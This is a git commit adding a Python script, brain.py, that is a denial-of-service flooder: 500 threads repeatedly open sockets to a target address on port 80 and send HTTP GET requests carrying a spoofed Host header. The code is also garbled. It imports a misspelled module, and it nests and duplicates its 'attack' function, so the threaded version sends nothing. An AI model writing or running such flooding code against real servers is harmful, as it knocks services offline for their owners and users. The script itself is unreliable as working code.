d770baefd3fe837ec065b81324c0c72d0af7cedd
stormingbrain423 <75332895+stormingbrain423@users.noreply.github.com>
2020-12-02 00:17:13 +0530

    Add files via upload

---
+++ brain.py
@@ -0,0 +1,39 @@
+import  threading
+import socket
+import pyiglet
+a = pyfiglet.figlet_format("Geeks For Geeks")
+print(a)
+
+target = '192.168.1.1'
+port = 80
+fake_ip = "182.21.20.32"
+
+def attack():
+   def attack():
+    while True:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((target, port))
+        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
+        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
+        s.close()
+
+for i in range(500):
+    thread = threading.Thread(target=attack)
+    thread.start()
+
+attack_num = 0
+
+def attack():
+    while True:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((target, port))
+        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
+        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
+        
+        global attack_num
+        attack_num += 1
+        print(attack_num)
+        
+        s.close()
+
+
